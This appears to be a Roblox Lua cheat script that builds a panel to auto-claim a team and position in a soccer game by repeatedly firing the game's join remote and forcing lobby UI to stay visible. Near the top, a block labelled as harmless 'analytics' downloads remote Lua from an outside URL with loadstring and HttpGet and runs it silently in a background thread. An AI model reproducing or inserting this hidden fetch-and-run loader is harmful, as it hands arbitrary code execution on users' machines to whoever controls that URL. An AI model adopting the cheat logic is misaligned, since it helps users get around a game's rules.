-- [[ Rscripts Risk Notice ]]
-- This script is not verified by rscripts.net. Deal with caution.
--
-- Stay safe:
--   • Never log in on unofficial Roblox sites or lookalike domains.
--   • Real Roblox links use roblox.com (check the .com ending).
--   • Treat fake Roblox login / "claim reward" pages as phishing.
-- [[ End Rscripts Risk Notice ]]

--[[rscripts:analytics:start]]
-- Script analytics (enabled by the creator on rscripts.net).
-- Runs in its own thread and cannot affect the script below.
task.spawn(function()
	pcall(function()
		loadstring(game:HttpGet("https://rscripts.net/api/telemetry/v2/client.lua?s=6aaa3d0bea05b95ccd29f3a3"))()
	end)
end)
--[[rscripts:analytics:end]]

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

--------------------------------------------------------------------------------
-- 1. SEARCH FOR REMOTE EVENTS
--------------------------------------------------------------------------------
local EventsFolder = ReplicatedStorage:WaitForChild("Events", 5)
local GameEvents = EventsFolder and EventsFolder:WaitForChild("Game", 5)
local JoinGameEvent = GameEvents and GameEvents:WaitForChild("JoinGame", 5)

if not JoinGameEvent then
    warn("[AutoJoin] Could NOT find Event game.ReplicatedStorage.Events.Game.JoinGame!")
end

--------------------------------------------------------------------------------
-- 2. CREATE CONTROL PANEL UI (ENGLISH)
--------------------------------------------------------------------------------
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "FixAutoTeamUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = PlayerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 240, 0, 270)
frame.Position = UDim2.new(0.05, 0, 0.35, 0)
frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 8)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 32)
title.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 13
title.Text = "⚽ Auto Join Team Fix"
title.Parent = frame

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 8)
titleCorner.Parent = title

-- CONFIGURATION VARIABLES
local isAuto = false
local selectedTeam = "Home"
local selectedRole = "CF"

-- EXACT ROLES BASED ON GAME HIERARCHY
local rolesList = {"CF", "CM", "GK", "LW", "RW"}

-- UI BUTTONS
local toggleBtn = Instance.new("TextButton")
toggleBtn.Size = UDim2.new(0.9, 0, 0, 35)
toggleBtn.Position = UDim2.new(0.05, 0, 0.15, 0)
toggleBtn.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
toggleBtn.Font = Enum.Font.GothamBold
toggleBtn.TextSize = 13
toggleBtn.Text = "Auto Join: OFF"
toggleBtn.Parent = frame

local toggleCorner = Instance.new("UICorner")
toggleCorner.CornerRadius = UDim.new(0, 6)
toggleCorner.Parent = toggleBtn

local teamBtn = Instance.new("TextButton")
teamBtn.Size = UDim2.new(0.9, 0, 0, 30)
teamBtn.Position = UDim2.new(0.05, 0, 0.31, 0)
teamBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
teamBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
teamBtn.Font = Enum.Font.Gotham
teamBtn.TextSize = 12
teamBtn.Text = "Team: Home"
teamBtn.Parent = frame

local roleBtn = Instance.new("TextButton")
roleBtn.Size = UDim2.new(0.9, 0, 0, 30)
roleBtn.Position = UDim2.new(0.05, 0, 0.45, 0)
roleBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
roleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
roleBtn.Font = Enum.Font.Gotham
roleBtn.TextSize = 12
roleBtn.Text = "Role: CF"
roleBtn.Parent = frame

-- STATUS LABEL (AVAILABLE / NOT AVAILABLE)
local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(0.9, 0, 0, 22)
statusLabel.Position = UDim2.new(0.05, 0, 0.59, 0)
statusLabel.BackgroundTransparency = 1
statusLabel.Font = Enum.Font.GothamBold
statusLabel.TextSize = 11
statusLabel.Text = "Status: Checking..."
statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
statusLabel.Parent = frame

local manualBtn = Instance.new("TextButton")
manualBtn.Size = UDim2.new(0.9, 0, 0, 32)
manualBtn.Position = UDim2.new(0.05, 0, 0.72, 0)
manualBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
manualBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
manualBtn.Font = Enum.Font.GothamBold
manualBtn.TextSize = 12
manualBtn.Text = "⚡ Join Now ⚡"
manualBtn.Parent = frame

--------------------------------------------------------------------------------
-- 3. SCAN PLAYER ROLES FOR AVAILABILITY
--------------------------------------------------------------------------------
local function checkRoleAvailability(targetTeam, targetRole)
    for _, plr in ipairs(Players:GetPlayers()) do
        -- Kiểm tra Team của người chơi
        local plrTeam = plr.Team and plr.Team.Name or (plr:FindFirstChild("Team") and plr.Team.Value)
        
        -- Lấy giá trị Role của người chơi (dạng Attribute, Value Object, hoặc Property)
        local plrRole = plr:GetAttribute("Role") 
            or (plr:FindFirstChild("Role") and plr.Role.Value)
            or (pcall(function() return plr.Role end) and plr.Role)

        -- Nếu tìm thấy người chơi khác ở đúng Team và đúng Role đó
        if plrTeam == targetTeam and tostring(plrRole) == targetRole then
            return false -- Vị trí đã có người giữ
        end
    end
    return true -- Vị trí còn trống
end

local function updateStatusUI()
    local isAvailable = checkRoleAvailability(selectedTeam, selectedRole)
    if isAvailable then
        statusLabel.Text = "Status: Available"
        statusLabel.TextColor3 = Color3.fromRGB(50, 220, 50)
    else
        statusLabel.Text = "Status: Not Available"
        statusLabel.TextColor3 = Color3.fromRGB(220, 50, 50)
    end
    return isAvailable
end

--------------------------------------------------------------------------------
-- 4. JOIN EVENT FUNCTION
--------------------------------------------------------------------------------
local function sendJoinRequest()
    if JoinGameEvent then
        print(string.format("[AutoJoin] Sending request: Team = %s | Role = %s", selectedTeam, selectedRole))
        JoinGameEvent:FireServer(selectedTeam, selectedRole)
    else
        local fallbackEvent = ReplicatedStorage:FindFirstChild("JoinTeam", true) 
            or ReplicatedStorage:FindFirstChild("ChangeTeam", true)
            or ReplicatedStorage:FindFirstChild("SelectTeam", true)

        if fallbackEvent and fallbackEvent:IsA("RemoteEvent") then
            fallbackEvent:FireServer(selectedTeam, selectedRole)
        end
    end
end

--------------------------------------------------------------------------------
-- 5. BUTTON INTERACTION LOGIC
--------------------------------------------------------------------------------
toggleBtn.MouseButton1Click:Connect(function()
    isAuto = not isAuto
    if isAuto then
        toggleBtn.Text = "Auto Join: ON"
        toggleBtn.BackgroundColor3 = Color3.fromRGB(50, 180, 50)
        sendJoinRequest()
    else
        toggleBtn.Text = "Auto Join: OFF"
        toggleBtn.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
    end
end)

teamBtn.MouseButton1Click:Connect(function()
    selectedTeam = (selectedTeam == "Home") and "Away" or "Home"
    teamBtn.Text = "Team: " .. selectedTeam
    updateStatusUI()
end)

roleBtn.MouseButton1Click:Connect(function()
    local currentIdx = table.find(rolesList, selectedRole) or 1
    local nextIdx = (currentIdx % #rolesList) + 1
    selectedRole = rolesList[nextIdx]
    roleBtn.Text = "Role: " .. selectedRole
    updateStatusUI()
end)

manualBtn.MouseButton1Click:Connect(function()
    sendJoinRequest()
end)

--------------------------------------------------------------------------------
-- 6. AUTO DETECT & JOIN LOOP
--------------------------------------------------------------------------------
task.spawn(function()
    while task.wait(0.3) do
        local available = updateStatusUI()
        
        -- Chỉ gửi request nếu Auto Bật VÀ Vị trí hiển thị Available
        if isAuto and available then
            sendJoinRequest()
        end
    end
end)

--------------------------------------------------------------------------------
-- 7. FORCE LOBBY UI & PLAY BUTTON VISIBILITY
--------------------------------------------------------------------------------
local SCREEN_GUI_NAME = "LobbyUI"           
local TEAM_SELECT_NAME = "TeamSelectFrame"  
local PLAY_BUTTON_NAME = "PlayButton"       

local function keepElementVisible(instance, propertyName)
    if not instance then return end
    instance[propertyName] = true

    instance:GetPropertyChangedSignal(propertyName):Connect(function()
        if instance[propertyName] == false then
            task.defer(function()
                instance[propertyName] = true
            end)
        end
    end)
end

local function initVisibilityKeeper()
    local targetGui = PlayerGui:WaitForChild(SCREEN_GUI_NAME, 5)
    if targetGui then
        if targetGui:IsA("ScreenGui") then
            keepElementVisible(targetGui, "Enabled")
        end

        local teamSelectFrame = targetGui:FindFirstChild(TEAM_SELECT_NAME, true)
        if teamSelectFrame then
            keepElementVisible(teamSelectFrame, "Visible")
        end

        local playButton = targetGui:FindFirstChild(PLAY_BUTTON_NAME, true)
        if playButton then
            keepElementVisible(playButton, "Visible")
        end
    end
end

task.spawn(initVisibilityKeeper)
print("[AutoJoin] UI Fix with Player Role Scan loaded!")
